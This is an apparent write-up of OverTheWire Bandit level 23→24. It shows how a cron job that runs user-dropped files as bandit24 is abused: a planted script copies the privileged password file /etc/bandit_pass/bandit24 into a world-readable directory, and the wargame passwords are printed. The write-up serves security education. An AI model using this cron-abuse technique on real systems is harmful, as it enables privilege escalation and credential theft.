# Bandit Level 23 to 24

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Bandit |
| Level | 23 -> 24 |
| Status | Complete |

## Objective

Use the `bandit24` cron job to execute a script as `bandit24` and recover the next password.

## Given Access

User: `bandit23`

Password:

```text
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

## Recon

The cron entry runs `/usr/bin/cronjob_bandit24.sh` as `bandit24` every minute. The script changes into `/var/spool/bandit24/foo`, executes files owned by `bandit23`, then deletes them.

## Method

Create a writable temporary directory, place a script in the cron spool directory that writes `/etc/bandit_pass/bandit24` back into that temporary directory, and wait for cron to run it.

## Commands

```bash
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh

workdir=$(mktemp -d /tmp/bandit23_to_24.XXXXXX)
chmod 777 "$workdir"

cat > "$workdir/getpass.sh" <<EOF
#!/bin/bash
cat /etc/bandit_pass/bandit24 > "$workdir/password"
chmod 644 "$workdir/password"
EOF

chmod 755 "$workdir/getpass.sh"
cp "$workdir/getpass.sh" /var/spool/bandit24/foo/getpass.sh

cat "$workdir/password"
```

## Result

Password for `bandit24`:

```text
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

## Lesson

Cron jobs can be abused when they execute user-controlled files. Here, ownership checks mattered: the script had to be created by `bandit23`, but the privileged cron process executed it as `bandit24`.

## References

- https://overthewire.org/wargames/bandit/
